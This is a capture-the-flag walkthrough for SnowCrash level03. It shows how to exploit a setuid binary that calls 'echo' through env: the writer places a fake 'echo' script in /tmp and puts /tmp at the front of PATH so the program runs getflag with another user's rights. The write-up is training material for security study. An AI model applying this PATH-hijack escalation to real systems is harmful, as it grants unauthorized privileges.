# SnowCrash Level03 Guide
This guide will walk you through the process of finding the password for the `flag03` user.

## Procedure:

1. **Examine files in the current directory**
   
We start by displaying the files and folders of the current directory.
```bash
ls -la
```
We find a file named level03 with the following permissions:
```bash
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
The file is executable by the owner, the group, and others, so by everyone.
Additionally, the file is executed with the owner’s and group's rights (setuid, setgid).

2. **Execute level03**

We execute the file level03.
```bash
./level03
```
The program displays the following output:
```bash
Exploit me
```

3. **Analyze level03**

We look at where the message comes from.
```bash
strings level03 | grep "Exploit"
```
Returns
```bash
/usr/bin/env echo Exploit me
```
The program uses the `echo` command to display the message.  
We are going to execute the getflag command instead of echo.  
For this, we will create a file named echo that executes getflag when called.

5. **Create the echo file**

If we don't use the `/tmp` folder, we don't have the permissions to execute the following:
```bash
level03@SnowCrash:~$ echo getflag > echo
bash: echo: Permission denied
```
So we run:
```bash
echo getflag > /tmp/echo && chmod +x /tmp/echo
```
The `chmod` is used to give the `execute` rights to the file `/tmp/echo`.

8. **Add /tmp to the PATH**

Now, we need to add /tmp to the PATH so that the level03 program executes the echo file in /tmp instead of the one in /usr/bin/env.
```bash
export PATH=/tmp:$PATH && echo $PATH
```
We add `/tmp` at the beginning of the PATH so that the level03 program executes the echo file in /tmp before the one in /usr/bin/env.
We also verify that /tmp has been added to the PATH.


9. **Exploit level03**

Execute the level03 program.
```bash
./level03
```
It now prints the token !